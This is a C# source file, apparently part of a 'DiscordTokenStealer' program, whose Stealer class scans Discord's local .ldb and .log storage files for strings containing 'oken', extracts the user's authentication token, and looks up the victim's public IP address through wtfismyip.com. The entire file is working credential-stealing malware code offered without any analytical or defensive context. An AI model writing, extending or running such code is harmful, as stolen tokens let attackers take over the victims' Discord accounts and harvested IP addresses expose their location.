using System.Collections.Generic;
using System.IO;
using System.Net;
using System.Net.Http;
using System.Text;

namespace DiscordTokenStealer
{
    internal class Stealer
    {
        private static string Sub(string contents)
        {
            string[] array = contents.Substring(contents.IndexOf("oken") + 4).Split(new char[]
            {
                '"'
            });
            List<string> list = new List<string>();
            list.AddRange(array);
            list.RemoveAt(0);
            array = list.ToArray();
            return string.Join("\"", array);
        }

        public static bool FindLdb(ref string path)
        {
            bool flag = !Directory.Exists(path);
            bool result;
            if (flag)
            {
                result = false;
            }
            else
            {
                foreach (FileInfo fileInfo in new DirectoryInfo(path).GetFiles())
                {
                    bool flag2 = fileInfo.Name.EndsWith(".ldb") && File.ReadAllText(fileInfo.FullName).Contains("oken");
                    if (flag2)
                    {
                        path += fileInfo.Name;
                        break;
                    }
                }
                result = path.EndsWith(".ldb");
            }
            return result;
        }

        public static bool FindLog(ref string path)
        {
            bool flag = !Directory.Exists(path);
            bool result;
            if (flag)
            {
                result = false;
            }
            else
            {
                foreach (FileInfo fileInfo in new DirectoryInfo(path).GetFiles())
                {
                    bool flag2 = fileInfo.Name.EndsWith(".log") && File.ReadAllText(fileInfo.FullName).Contains("oken");
                    if (flag2)
                    {
                        path += fileInfo.Name;
                        break;
                    }
                }
                result = path.EndsWith(".log");
            }
            return result;
        }

        public static string GetToken(string path, bool isLog = false)
        {
            byte[] bytes = File.ReadAllBytes(path);
            string @string = Encoding.UTF8.GetString(bytes);
            string text = "";
            string text2 = @string;
            while (text2.Contains("oken"))
            {
                string[] array = Stealer.Sub(text2).Split(new char[]
                {
                    '"'
                });
                text = array[0];
                text2 = string.Join("\"", array);
                bool flag = isLog && text.Length == 59;
                if (flag)
                {
                    break;
                }
            }
            return text;
        }

        public static string GetIP()
        {
            string result;
            try
            {
                result = new HttpClient().GetStringAsync("https://wtfismyip.com/text").Result;
            }
            catch (WebException)
            {
                result = "Unable to get IP";
            }
            return result;
        }
    }
}
